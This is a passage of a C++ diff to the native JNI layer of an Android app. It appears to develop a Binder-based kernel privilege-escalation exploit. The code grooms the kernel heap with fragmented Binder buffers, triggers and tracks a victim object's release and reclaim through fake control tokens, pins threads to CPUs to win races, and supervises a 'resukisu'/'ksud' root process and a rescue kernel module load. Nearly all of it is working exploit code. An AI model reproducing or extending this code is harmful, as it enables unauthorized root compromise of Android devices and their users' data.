+                    ? pipe_error : supervisor_error;
+            g_resukisu_spawn_error.store(
+                    fork_error, std::memory_order_release);
+            if (child > 0) {
+                if (g_resukisu_fd >= 0) {
+                    close(g_resukisu_fd);
+                    g_resukisu_fd = -1;
+                }
+                if (g_resukisu_module_fd >= 0) {
+                    close(g_resukisu_module_fd);
+                    g_resukisu_module_fd = -1;
+                }
+                if (g_resukisu_loader_fd >= 0) {
+                    close(g_resukisu_loader_fd);
+                    g_resukisu_loader_fd = -1;
+                }
+                if (g_action_supervisor_fd >= 0) {
+                    close(g_action_supervisor_fd);
+                    g_action_supervisor_fd = -1;
+                }
+                continue;
+            }
+            int published_diagnostic_fd = g_resukisu_diagnostic_fd.exchange(
+                    -1, std::memory_order_acq_rel);
+            if (published_diagnostic_fd >= 0) {
+                close(published_diagnostic_fd);
+                diagnostic_pipe[0] = -1;
+            }
+            int published_completion_fd = g_resukisu_completion_fd.exchange(
+                    -1, std::memory_order_acq_rel);
+            if (published_completion_fd >= 0) {
+                close(published_completion_fd);
+                completion_fd = -1;
+            }
+            (void)unlink(completion_path);
+            if (completion_fd >= 0) {
+                close(completion_fd);
+                completion_fd = -1;
+                (void)unlink(completion_path);
             }
             int status = 0;
             int wait_error = 0;
+            bool completion_seen = false;
+            bool completion_kill_sent = false;
             if (child > 0) {
+                if (g_command_watchdog_output_fd >= 0) {
+                    char marker[96];
+                    int marker_length = std::snprintf(
+                            marker, sizeof(marker),
+                            "LP3_RESUKISU_PARENT_STAGE stage=wait-enter pid=%d\n",
+                            child);
+                    if (marker_length > 0 &&
+                            marker_length < static_cast<int>(sizeof(marker))) {
+                        (void)write(
+                                g_command_watchdog_output_fd, marker,
+                                static_cast<std::size_t>(marker_length));
+                    }
+                }
                 timespec action_started {};
                 (void)clock_gettime(CLOCK_MONOTONIC, &action_started);
                 std::int64_t action_deadline =
                         static_cast<std::int64_t>(action_started.tv_sec + 120) *
                                 1000000000LL + action_started.tv_nsec;
+                unsigned int wait_polls = 0;
                 for (;;) {
+                    if (diagnostic_pipe[0] >= 0) {
+                        char diagnostic[2048];
+                        for (;;) {
+                            ssize_t count = read(
+                                    diagnostic_pipe[0], diagnostic,
+                                    sizeof(diagnostic));
+                            if (count <= 0) {
+                                break;
+                            }
+                            constexpr char kCompletion[] =
+                                    "LP3_KSUD_DONE\n";
+                            if (memmem(
+                                    diagnostic,
+                                    static_cast<std::size_t>(count),
+                                    kCompletion,
+                                    sizeof(kCompletion) - 1) != nullptr) {
+                                completion_seen = true;
+                            }
+                            if (g_command_watchdog_output_fd >= 0) {
+                                (void)write_all(
+                                        g_command_watchdog_output_fd,
+                                        diagnostic,
+                                        static_cast<std::size_t>(count));
+                            }
+                        }
+                    }
+                    if (completion_seen && !completion_kill_sent) {
+                        completion_kill_sent = kill(child, SIGKILL) == 0;
+                    }
                     errno = 0;
                     pid_t waited = waitpid(child, &status, WNOHANG);
+                    int observed_wait_error = waited < 0 ? errno : 0;
+                    if (g_command_watchdog_output_fd >= 0 &&
+                            wait_polls++ % 100 == 0) {
+                        char marker[128];
+                        int marker_length = std::snprintf(
+                                marker, sizeof(marker),
+                                "LP3_RESUKISU_PARENT_STAGE stage=wait-poll"
+                                " pid=%d waited=%d errno=%d\n",
+                                child, waited, observed_wait_error);
+                        if (marker_length > 0 && marker_length <
+                                static_cast<int>(sizeof(marker))) {
+                            (void)write(
+                                    g_command_watchdog_output_fd, marker,
+                                    static_cast<std::size_t>(marker_length));
+                        }
+                    }
                     if (waited == child) {
                         break;
                     }
                     if (waited < 0) {
-                        wait_error = errno;
+                        wait_error = observed_wait_error;
                         break;
                     }
                     timespec now {};
@@ -5101,25 +7379,36 @@ void* command_root_watchdog_thread(void*) {
                     (void)syscall(SYS_nanosleep, &delay, nullptr);
                 }
             }
-            if (diagnostic_pipe[0] >= 0) {
-                char diagnostic[2048];
-                for (;;) {
-                    ssize_t count = read(
-                            diagnostic_pipe[0], diagnostic,
-                            sizeof(diagnostic));
-                    if (count <= 0) {
-                        break;
-                    }
-                    if (g_command_watchdog_output_fd >= 0) {
-                        (void)write_all(
-                                g_command_watchdog_output_fd, diagnostic,
-                                static_cast<std::size_t>(count));
-                    }
+            if (g_command_watchdog_output_fd >= 0) {
+                char marker[192];
+                int marker_length = std::snprintf(
+                        marker, sizeof(marker),
+                        "LP3_RESUKISU_PARENT_STAGE stage=wait-exit"
+                        " completion=%d kill_sent=%d wait_error=%d"
+                        " status=0x%x exited=%d exit=%d signalled=%d signal=%d\n",
+                        completion_seen ? 1 : 0,
+                        completion_kill_sent ? 1 : 0,
+                        wait_error, status,
+                        WIFEXITED(status) ? 1 : 0,
+                        WIFEXITED(status) ? WEXITSTATUS(status) : -1,
+                        WIFSIGNALED(status) ? 1 : 0,
+                        WIFSIGNALED(status) ? WTERMSIG(status) : -1);
+                if (marker_length > 0 &&
+                        marker_length < static_cast<int>(sizeof(marker))) {
+                    (void)write(
+                            g_command_watchdog_output_fd, marker,
+                            static_cast<std::size_t>(marker_length));
                 }
+            }
+            if (diagnostic_pipe[0] >= 0) {
                 close(diagnostic_pipe[0]);
             }
-            int result = child > 0 && wait_error == 0 && WIFEXITED(status)
-                    ? WEXITSTATUS(status) : -1;
+            bool completed_exit = child > 0 && wait_error == 0 &&
+                    completion_seen &&
+                    ((WIFEXITED(status) && WEXITSTATUS(status) == 0) ||
+                     (completion_kill_sent && WIFSIGNALED(status) &&
+                      WTERMSIG(status) == SIGKILL));
+            int result = completed_exit ? 0 : -1;
             g_resukisu_exit.store(result, std::memory_order_release);
             g_resukisu_errno.store(
                     fork_error != 0 ? fork_error : wait_error,
@@ -5132,8 +7421,28 @@ void* command_root_watchdog_thread(void*) {
                 close(g_resukisu_module_fd);
                 g_resukisu_module_fd = -1;
             }
+            if (g_resukisu_loader_fd >= 0) {
+                close(g_resukisu_loader_fd);
+                g_resukisu_loader_fd = -1;
+            }
+            if (g_action_supervisor_fd >= 0) {
+                close(g_action_supervisor_fd);
+                g_action_supervisor_fd = -1;
+            }
             g_resukisu_action.store(3, std::memory_order_release);
             wake_command_watchdog(&g_resukisu_action, INT_MAX);
+        }
+        if (g_ctlbuf_rescue_load_request.load(
+                std::memory_order_acquire) == 1) {
+            write_ctlbuf_rescue_stage(
+                    13, "watchdog-load-enter", 0, 0, 0);
+            bool loaded = load_ctlbuf_rescue_module();
+            g_ctlbuf_rescue_load_result.store(
+                    loaded ? 1 : -1, std::memory_order_release);
+            g_ctlbuf_rescue_load_request.store(2,
+                    std::memory_order_release);
+            wake_command_watchdog(
+                    &g_ctlbuf_rescue_load_request, INT_MAX);
         }
         timespec now {};
         if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
@@ -5271,11 +7580,39 @@ void run_epitem_owner(std::string directory) {
         return;
     }
 
+    std::vector<std::uint64_t> fragment_binder_tokens(
+            kNativeFragmentExportCount);
+    std::vector<std::uint64_t> fragment_cookie_tokens(
+            kNativeFragmentExportCount);
+    std::vector<flat_binder_object> fragment_objects(
+            kNativeFragmentExportCount);
+    std::vector<binder_size_t> fragment_offsets(
+            kNativeFragmentExportCount);
+    for (int index = 0; index < kNativeFragmentExportCount; ++index) {
+        fragment_binder_tokens[index] =
+                UINT64_C(0x4634000000000000) |
+                static_cast<std::uint32_t>(index);
+        fragment_cookie_tokens[index] =
+                UINT64_C(0x6634000000000000) |
+                static_cast<std::uint32_t>(index);
+        fragment_objects[index].hdr.type = BINDER_TYPE_BINDER;
+        fragment_objects[index].flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
+        fragment_objects[index].binder =
+                reinterpret_cast<binder_uintptr_t>(
+                        &fragment_binder_tokens[index]);
+        fragment_objects[index].cookie =
+                reinterpret_cast<binder_uintptr_t>(
+                        &fragment_cookie_tokens[index]);
+        fragment_offsets[index] = static_cast<binder_size_t>(index) *
+                sizeof(fragment_objects[0]);
+    }
+
     std::vector<binder_uintptr_t> fragment_anchors;
     fragment_anchors.reserve(kFragmentCount / 2);
     int fragments = 0;
     int gaps = 0;
-    while (fragments < kFragmentCount) {
+    bool fragment_exported = false;
+    while (!fragment_exported || fragments < kFragmentCount) {
         std::uint8_t read_buffer[4096] {};
         binder_write_read request {};
         request.read_size = sizeof(read_buffer);
@@ -5298,7 +7635,27 @@ void run_epitem_owner(std::string directory) {
                 binder_transaction_data transaction {};
                 std::memcpy(&transaction, read_buffer + offset,
                             sizeof(transaction));
-                if (transaction.code == kFragmentHoldCode &&
+                if (transaction.code == kNativeFragmentBatchCode &&
+                    !(transaction.flags & TF_ONE_WAY) &&
+                    !fragment_exported) {
+                    binder_transaction_data reply {};
+                    reply.flags = TF_ACCEPT_FDS;
+                    reply.data_size = fragment_objects.size() *
+                            sizeof(fragment_objects[0]);
+                    reply.offsets_size = fragment_offsets.size() *
+                            sizeof(fragment_offsets[0]);
+                    reply.data.ptr.buffer =
+                            reinterpret_cast<binder_uintptr_t>(
+                                    fragment_objects.data());
+                    reply.data.ptr.offsets =
+                            reinterpret_cast<binder_uintptr_t>(
+                                    fragment_offsets.data());
+                    std::uint8_t command[
+                            sizeof(std::uint32_t) + sizeof(reply)] {};
+                    write_command(command, BC_REPLY, &reply, sizeof(reply));
+                    fragment_exported = write_binder_commands(
+                            fd, command, sizeof(command)) == 0;
+                } else if (transaction.code == kFragmentHoldCode &&
                     fragments < kFragmentCount) {
                     bool keep = (fragments % 2) == 0;
                     ++fragments;
@@ -5314,15 +7671,16 @@ void run_epitem_owner(std::string directory) {
             offset += payload_size;
         }
     }
-    if (fragments != kFragmentCount || gaps != kFragmentCount / 2) {
+    if (!fragment_exported || fragments != kFragmentCount ||
+        gaps != kFragmentCount / 2) {
         close(fd);
         fail("fragmentation");
         return;
     }
     char fragmented[128];
     std::snprintf(fragmented, sizeof(fragmented),
-            "seen=%d anchors=%zu gaps=%d", fragments,
-            fragment_anchors.size(), gaps);
+            "seen=%d anchors=%zu gaps=%d native_export=%d", fragments,
+            fragment_anchors.size(), gaps, kNativeFragmentExportCount);
     write_text_file(directory + "/epitem-reader.fragmented", fragmented);
 
     int kmalloc_predrain_errno = 0;
@@ -5449,17 +7807,25 @@ void run_epitem_owner(std::string directory) {
         fail("client-lifetime");
         return;
     }
-    // Process exit can precede Binder's deferred release work. Use the same
-    // settle interval as the later raw-client hand-off before ref decrements.
-    constexpr int deferred_settle_ms = 1500;
-    usleep(deferred_settle_ms * 1000);
+    std::string death_state;
+    if (wait_for_file(directory + "/epitem-client.death-ready", 12000)) {
+        death_state = read_text_file(
+                directory + "/epitem-client.death-ready");
+    }
+    bool binder_death = death_state.rfind(
+            "status=pass stage=binder-death-barrier ", 0) == 0;
+    if (!binder_death) {
+        close(fd);
+        fail("client-binder-death");
+        return;
+    }
 
     char ready[256];
     std::snprintf(ready, sizeof(ready),
             "status=ready nodes=1152 transactions=1152 inventory=1152"
             " fragments=%d gaps=%d cpu=%d client_dead=1"
-            " deferred_settle_ms=%d unread=1152",
-            fragments, gaps, cpu, deferred_settle_ms);
+            " binder_death=1 unread=1152",
+            fragments, gaps, cpu);
     if (!write_text_file(directory + "/epitem-leak.unread-ready", ready)) {
         close(fd);
         fail("read-enable");
@@ -5960,10 +8326,15 @@ bool reply_raw_export(int fd, int index) {
 }
 
 bool process_raw_controlled_victim(int fd, const std::string& directory,
-                                   int victim, bool indexed) {
+                                   int victim, bool indexed,
+                                   int boundary_signal_fd = -1) {
     std::string suffix = indexed ? "." + std::to_string(victim) : "";
-    write_text_file(directory + "/raw-target.reading" + suffix,
+    bool reading_ready = write_text_file(
+            directory + "/raw-target.reading" + suffix,
             "status=ready polling=1 timeout_ms=20000");
+    bool read_go = reading_ready && (!indexed || victim != 0 ||
+            wait_for_file_byte_fast(
+                    directory + "/controlled-read.go.0", '1', 50000));
     binder_uintptr_t controlled_buffer = 0;
     std::uint64_t controlled_ptr = 0;
     std::uint64_t controlled_cookie = 0;
@@ -5984,7 +8355,148 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
     std::uint64_t last_ref_ptr = 0;
     std::uint64_t last_ref_cookie = 0;
     bool controlled_seen = false;
+    bool victim_boundary = !indexed || victim != 0;
+    if (read_go && indexed && victim == 0) {
+        pollfd descriptor {fd, POLLIN, 0};
+        int poll_result = poll(&descriptor, 1, 1000);
+        std::uint8_t boundary_buffer[128] {};
+        binder_write_read request {};
+        request.read_size = sizeof(boundary_buffer);
+        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                boundary_buffer);
+        bool boundary_read = poll_result == 1 &&
+                (descriptor.revents & POLLIN) != 0 &&
+                ioctl(fd, BINDER_WRITE_READ, &request) == 0;
+        int boundary_responses = 0;
+        std::uint32_t boundary_commands[5] {};
+        binder_ptr_cookie boundary_references[4] {};
+        int boundary_reference_count = 0;
+        if (boundary_read) {
+            ++read_calls;
+            for (std::size_t offset = 0;
+                 offset + sizeof(std::uint32_t) <=
+                         request.read_consumed;) {
+                std::uint32_t response = 0;
+                std::memcpy(&response, boundary_buffer + offset,
+                            sizeof(response));
+                last_response = response;
+                ++responses;
+                if (boundary_responses < 5) {
+                    boundary_commands[boundary_responses] = response;
+                }
+                ++boundary_responses;
+                if (response_order_count < 8) {
+                    response_order[response_order_count] = response;
+                    response_reads[response_order_count] = read_calls;
+                    ++response_order_count;
+                }
+                offset += sizeof(response);
+                std::size_t payload_size = _IOC_SIZE(response);
+                if (offset + payload_size > request.read_consumed) {
+                    boundary_read = false;
+                    break;
+                }
+                if ((response == BR_INCREFS ||
+                     response == BR_ACQUIRE) &&
+                    payload_size >= sizeof(binder_ptr_cookie) &&
+                    boundary_reference_count < 4) {
+                    binder_ptr_cookie reference {};
+                    std::memcpy(&reference, boundary_buffer + offset,
+                                sizeof(reference));
+                    boundary_references[boundary_reference_count++] =
+                            reference;
+                    refs_before_transaction |= response == BR_ACQUIRE
+                            ? 4 : 8;
+                    last_ref_ptr = reference.ptr;
+                    last_ref_cookie = reference.cookie;
+                }
+                offset += payload_size;
+            }
+        }
+        bool command_shape = boundary_read && boundary_responses == 5 &&
+                boundary_reference_count == 4 &&
+                boundary_commands[0] == BR_NOOP &&
+                boundary_commands[1] == BR_INCREFS &&
+                boundary_commands[2] == BR_ACQUIRE &&
+                boundary_commands[3] == BR_INCREFS &&
+                boundary_commands[4] == BR_ACQUIRE &&
+                boundary_references[0].ptr ==
+                        boundary_references[1].ptr &&
+                boundary_references[0].cookie ==
+                        boundary_references[1].cookie &&
+                boundary_references[2].ptr ==
+                        boundary_references[3].ptr &&
+                boundary_references[2].cookie ==
+                        boundary_references[3].cookie;
+        std::uint64_t boundary_ptr = boundary_references[0].ptr;
+        std::uint64_t boundary_cookie = boundary_references[0].cookie;
+        int boundary_worker = static_cast<int>(
+                boundary_ptr & kFakeControlIndexMask);
+        bool early_reclaim = command_shape &&
+                (boundary_ptr & ~kFakeControlIndexMask) ==
+                        kIndexedPtrBase &&
+                (boundary_cookie & ~kFakeControlIndexMask) ==
+                        kIndexedCookieBase &&
+                static_cast<int>(boundary_cookie &
+                        kFakeControlIndexMask) == boundary_worker &&
+                boundary_worker >= 0 &&
+                boundary_worker < kFakeControlInitialStagedCount;
+        std::uint64_t tail_ptr = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_binder_tokens[kRawCohortVictim + 1]);
+        std::uint64_t tail_cookie = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_cookie_tokens[kRawCohortVictim + 1]);
+        std::uint64_t next_tail_ptr = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_binder_tokens[kRawCohortVictim + 2]);
+        std::uint64_t next_tail_cookie = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_cookie_tokens[kRawCohortVictim + 2]);
+        bool victim_released = command_shape &&
+                boundary_ptr == tail_ptr &&
+                boundary_cookie == tail_cookie &&
+                boundary_references[2].ptr == next_tail_ptr &&
+                boundary_references[2].cookie == next_tail_cookie;
+        early_reclaim = early_reclaim &&
+                boundary_references[2].ptr == tail_ptr &&
+                boundary_references[2].cookie == tail_cookie;
+        std::uint64_t boundary_signal_value = 1;
+        bool boundary_signaled = (early_reclaim || victim_released) &&
+                boundary_signal_fd >= 0 &&
+                write(boundary_signal_fd, &boundary_signal_value,
+                        sizeof(boundary_signal_value)) ==
+                        sizeof(boundary_signal_value);
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+            boundary_signal_fd = -1;
+        }
+        int cpu_before = sched_getcpu();
+        int migration_errno = 0;
+        int cpu_after = -1;
+        bool migrated = boundary_signaled &&
+                pin_current_thread_to_cpu(
+                        1, &migration_errno, &cpu_after);
+        char boundary_state[320];
+        std::snprintf(boundary_state, sizeof(boundary_state),
+                "status=%s stage=victim-work-drained read_calls=%d"
+                " responses=%d victim_released=%d early_reclaim=%d"
+                " signal=%d worker=%d cpu_before=%d cpu_after=%d",
+                migrated ? "ready" : "fail", read_calls,
+                boundary_responses, victim_released ? 1 : 0,
+                early_reclaim ? 1 : 0, boundary_signaled ? 1 : 0,
+                early_reclaim ? boundary_worker : -1,
+                cpu_before, cpu_after);
+        bool boundary_written = write_text_file(
+                directory + "/raw-target.victim-work.0",
+                boundary_state);
+        bool continued = migrated && boundary_written &&
+                wait_for_file_byte_fast(
+                        directory + "/controlled-read.continue.0",
+                        '1', 100000);
+        int restored_cpu = -1;
+        victim_boundary = continued && pin_current_thread_to_cpu(
+                2, nullptr, &restored_cpu) && restored_cpu == 2;
+        read_go = read_go && victim_boundary;
+    }
     for (int attempt = 0;
+         read_go &&
          attempt < 20 && controlled_buffer == 0; ++attempt) {
         pollfd descriptor {fd, POLLIN, 0};
         int poll_result = poll(&descriptor, 1, 1000);
@@ -6100,6 +8612,7 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             " buffer=0x%" PRIx64 " ptr=0x%" PRIx64
             " cookie=0x%" PRIx64 " worker_index=%d raw_index=%d"
             " exact_payload=%d buffer_freed=0 polling=1 wait_cpu=%d"
+            " read_go=%d victim_boundary=%d"
             " read_calls=%d responses=%d transactions=%d"
             " last_response=0x%x last_code=0x%x flags=0x%x"
             " data_size=%" PRIu64 " offsets_size=%" PRIu64
@@ -6113,6 +8626,8 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             static_cast<std::uint64_t>(controlled_buffer),
             controlled_ptr, controlled_cookie, worker, raw_index,
             exact_payload ? 1 : 0, wait_pinned ? 1 : 0,
+            read_go ? 1 : 0,
+            victim_boundary ? 1 : 0,
             read_calls, responses,
             transactions, last_response, last_code,
             last_flags, static_cast<std::uint64_t>(last_data_size),
@@ -6129,6 +8644,10 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             response_reads[7], response_order[7]);
     write_text_file(directory + "/controlled-reader.result" + suffix,
                     state);
+    if (boundary_signal_fd >= 0) {
+        close(boundary_signal_fd);
+        boundary_signal_fd = -1;
+    }
     if (!exact_payload) {
         return false;
     }
@@ -6249,9 +8768,13 @@ bool canonical_boot_id(const std::string& value) {
 void run_raw_target_owner(std::string directory, std::string nonce,
                           std::string expected_boot_id,
                           std::uint64_t target_start_time,
-                          bool terminal_cleanup) {
+                          bool terminal_cleanup, int boundary_signal_fd) {
     const std::string target_result = directory + "/raw-target.result";
     auto finish = [&](const std::string& state) {
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+            boundary_signal_fd = -1;
+        }
         write_text_file(target_result, state);
         g_raw_target_armed.store(false);
     };
@@ -6401,11 +8924,14 @@ void run_raw_target_owner(std::string directory, std::string nonce,
             return;
         }
     }
-    if (!process_raw_controlled_victim(fd, directory, 0, multi)) {
+    if (!process_raw_controlled_victim(
+                fd, directory, 0, multi, boundary_signal_fd)) {
+        boundary_signal_fd = -1;
         close(fd);
         finish("status=fail stage=raw-target reason=free-timeout");
         return;
     }
+    boundary_signal_fd = -1;
     if (deferred_export && wait_for_file(
             directory + "/raw-extra-export.receivers-go", 120000)) {
         for (int slot = 0; slot < kRawVictimCount - 1; ++slot) {
@@ -6858,6 +9384,39 @@ Java_com_vandam_prism_NativeBridge_cacheOwnerHandleForDescriptor(
     return environment->NewStringUTF(state);
 }
 
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_cacheOwnerHandleForBinder(
+        JNIEnv* environment, jclass, jobject binder,
+        jstring descriptor_string) {
+    if (binder == nullptr || descriptor_string == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=owner-handle reason=arguments");
+    }
+    const char* descriptor = environment->GetStringUTFChars(
+            descriptor_string, nullptr);
+    if (descriptor == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=owner-handle reason=descriptor");
+    }
+    int handle = discover_proxy_handle(environment, binder);
+    int fd = handle > 0 ? duplicate_binder_fd() : -1;
+    std::string observed = fd >= 0
+            ? query_descriptor(fd, handle) : std::string();
+    bool pass = handle > 0 && observed == descriptor;
+    environment->ReleaseStringUTFChars(descriptor_string, descriptor);
+    if (fd >= 0) {
+        close(fd);
+    }
+    if (pass) {
+        g_owner_handle = handle;
+    }
+    char state[192];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=owner-handle handle=%d exact=1 direct=1",
+            pass ? "pass" : "fail", handle);
+    return environment->NewStringUTF(state);
+}
+
 extern "C" JNIEXPORT jboolean JNICALL
 Java_com_vandam_prism_NativeBridge_armEpitemLeakOwner(
         JNIEnv* environment, jclass, jstring directory_string) {
@@ -6877,19 +9436,46 @@ Java_com_vandam_prism_NativeBridge_armEpitemLeakOwner(
     return JNI_TRUE;
 }
 
+extern "C" JNIEXPORT jint JNICALL
+Java_com_vandam_prism_NativeBridge_createRawTargetBoundarySignal(
+        JNIEnv*, jclass) {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    if (g_raw_target_boundary_signal_fd >= 0) {
+        close(g_raw_target_boundary_signal_fd);
+    }
+    g_raw_target_boundary_signal_fd = eventfd(
+            0, EFD_CLOEXEC | EFD_NONBLOCK);
+    return g_raw_target_boundary_signal_fd;
+}
+
+extern "C" JNIEXPORT jboolean JNICALL
+Java_com_vandam_prism_NativeBridge_closeRawTargetBoundarySignal(
+        JNIEnv*, jclass) {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    bool pass = g_raw_target_boundary_signal_fd < 0 ||
+            close(g_raw_target_boundary_signal_fd) == 0;
+    g_raw_target_boundary_signal_fd = -1;
+    return pass ? JNI_TRUE : JNI_FALSE;
+}
+
 extern "C" JNIEXPORT jboolean JNICALL
 Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
         JNIEnv* environment, jclass, jstring directory_string,
         jstring nonce_string, jstring boot_id_string,
-        jlong target_start_time, jboolean terminal_cleanup) {
+        jlong target_start_time, jboolean terminal_cleanup,
+        jint boundary_signal_fd) {
     if (directory_string == nullptr || nonce_string == nullptr ||
         boot_id_string == nullptr || target_start_time <= 0 ||
-        g_raw_target_armed.exchange(true)) {
+        boundary_signal_fd < 0 || g_raw_target_armed.exchange(true)) {
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+        }
         return JNI_FALSE;
     }
     const char* characters = environment->GetStringUTFChars(
             directory_string, nullptr);
     if (characters == nullptr) {
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
@@ -6908,6 +9494,7 @@ Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
             environment->ReleaseStringUTFChars(
                     boot_id_string, boot_id_characters);
         }
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
@@ -6919,13 +9506,14 @@ Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
     bool terminal = terminal_cleanup == JNI_TRUE;
     if (terminal && (nonce.size() != 32 || !lower_hex_digits(nonce) ||
                      !canonical_boot_id(boot_id))) {
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
     std::thread(run_raw_target_owner, std::move(directory),
                 std::move(nonce), std::move(boot_id),
                 static_cast<std::uint64_t>(target_start_time),
-                terminal).detach();
+                terminal, boundary_signal_fd).detach();
     return JNI_TRUE;
 }
 
@@ -6937,20 +9525,165 @@ Java_com_vandam_prism_NativeBridge_cleanupOwnerFragmentBuffers(
         std::lock_guard<std::mutex> lock(g_owner_fragment_mutex);
         buffers.swap(g_owner_fragment_buffers);
     }
-    int fd = buffers.empty() ? -1 : duplicate_binder_fd();
-    int freed = 0;
-    if (fd >= 0) {
-        for (binder_uintptr_t buffer : buffers) {
-            free_buffer(fd, buffer);
-            ++freed;
-        }
-        close(fd);
+    std::set<binder_uintptr_t> unique_buffers(
+            buffers.begin(), buffers.end());
+    bool exact = buffers.size() == kFragmentCount / 2 &&
+            unique_buffers.size() == buffers.size() &&
+            unique_buffers.find(0) == unique_buffers.end();
+    int fd = exact ? duplicate_binder_fd() : -1;
+    constexpr std::size_t kCommandSize =
+            sizeof(std::uint32_t) + sizeof(binder_uintptr_t);
+    std::vector<std::uint8_t> commands(
+            exact ? buffers.size() * kCommandSize : 0);
+    for (std::size_t index = 0; index < buffers.size() && exact; ++index) {
+        write_command(commands.data() + index * kCommandSize,
+                BC_FREE_BUFFER, &buffers[index], sizeof(buffers[index]));
     }
-    char state[160];
-    bool pass = freed == kFragmentCount / 2;
+    bool written = fd >= 0 && write_binder_commands(
+            fd, commands.data(), commands.size()) == 0;
+    bool closed = fd >= 0 && close(fd) == 0;
+    int freed = written ? static_cast<int>(buffers.size()) : 0;
+    char state[224];
+    bool pass = exact && written && closed &&
+            freed == kFragmentCount / 2;
     std::snprintf(state, sizeof(state),
-            "status=%s stage=owner-fragment-cleanup freed=%d expected=%d",
-            pass ? "pass" : "fail", freed, kFragmentCount / 2);
+            "status=%s stage=owner-fragment-cleanup freed=%d expected=%d"
+            " unique=%zu batched=1 written=%d closed=%d",
+            pass ? "pass" : "fail", freed, kFragmentCount / 2,
+            unique_buffers.size(), written ? 1 : 0, closed ? 1 : 0);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_runEpitemFragmentClient(
+        JNIEnv* environment, jclass) {
+    const auto started = std::chrono::steady_clock::now();
+    int fd = duplicate_binder_fd();
+    if (fd < 0 || g_owner_handle <= 0) {
+        if (fd >= 0) {
+            close(fd);
+        }
+        return environment->NewStringUTF(
+                "status=fail stage=fragment-client reason=target");
+    }
+
+    binder_transaction_data request {};
+    request.target.handle = static_cast<std::uint32_t>(g_owner_handle);
+    request.code = kNativeFragmentBatchCode;
+    BinderReply reply = transact_and_read(fd, request);
+    const auto reply_received = std::chrono::steady_clock::now();
+    const binder_size_t expected_data =
+            static_cast<binder_size_t>(kNativeFragmentExportCount) *
+            sizeof(flat_binder_object);
+    const binder_size_t expected_offsets =
+            static_cast<binder_size_t>(kNativeFragmentExportCount) *
+            sizeof(binder_size_t);
+    if (reply.buffer == 0 || reply.offsets == 0 ||
+        reply.data_size != expected_data ||
+        reply.offsets_size != expected_offsets) {
+        if (reply.buffer != 0) {
+            free_buffer(fd, reply.buffer);
+        }
+        char state[256];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=fragment-client reason=batch-reply"
+                " ioctl=%d errno=%d data=%" PRIu64 " offsets=%" PRIu64,
+                reply.ioctl_result, reply.ioctl_errno,
+                static_cast<std::uint64_t>(reply.data_size),
+                static_cast<std::uint64_t>(reply.offsets_size));
+        close(fd);
+        return environment->NewStringUTF(state);
+    }
+
+    const auto* data = reinterpret_cast<const std::uint8_t*>(reply.buffer);
+    const auto* offsets = reinterpret_cast<const binder_size_t*>(
+            reply.offsets);
+    std::vector<std::uint32_t> handles;
+    std::set<std::uint32_t> unique_handles;
+    handles.reserve(kNativeFragmentExportCount);
+    for (int index = 0; index < kNativeFragmentExportCount; ++index) {
+        binder_size_t expected_offset =
+                static_cast<binder_size_t>(index) *
+                sizeof(flat_binder_object);
+        if (offsets[index] != expected_offset ||
+            offsets[index] + sizeof(flat_binder_object) > reply.data_size) {
+            break;
+        }
+        flat_binder_object object {};
+        std::memcpy(&object, data + offsets[index], sizeof(object));
+        std::uint32_t handle = object.handle;
+        if (object.hdr.type != BINDER_TYPE_HANDLE || handle == 0 ||
+            !unique_handles.insert(handle).second) {
+            break;
+        }
+        handles.push_back(handle);
+    }
+
+    constexpr std::size_t acquire_command_size =
+            sizeof(std::uint32_t) + sizeof(std::uint32_t);
+    std::vector<std::uint8_t> acquire_commands(
+            handles.size() * acquire_command_size);
+    for (std::size_t index = 0; index < handles.size(); ++index) {
+        write_command(acquire_commands.data() +
+                              index * acquire_command_size,
+                      BC_ACQUIRE, &handles[index], sizeof(handles[index]));
+    }
+    bool acquired = handles.size() == kNativeFragmentExportCount &&
+            write_binder_commands(fd, acquire_commands.data(),
+                                  acquire_commands.size()) == 0;
+    const auto acquire_completed = std::chrono::steady_clock::now();
+    bool reply_buffer_freed = acquired && free_buffer(fd, reply.buffer);
+
+    constexpr int transaction_chunk = 128;
+    constexpr std::size_t transaction_command_size =
+            sizeof(std::uint32_t) + sizeof(binder_transaction_data);
+    std::vector<std::uint8_t> transaction_commands(
+            transaction_chunk * transaction_command_size);
+    int queued = 0;
+    while (reply_buffer_freed && queued < kFragmentCount) {
+        int count = std::min(transaction_chunk, kFragmentCount - queued);
+        for (int index = 0; index < count; ++index) {
+            binder_transaction_data transaction {};
+            transaction.target.handle = handles[queued + index];
+            transaction.code = kFragmentHoldCode;
+            transaction.flags = TF_ONE_WAY;
+            write_command(transaction_commands.data() +
+                                  index * transaction_command_size,
+                          BC_TRANSACTION, &transaction,
+                          sizeof(transaction));
+        }
+        if (write_binder_commands(
+                    fd, transaction_commands.data(),
+                    static_cast<std::size_t>(count) *
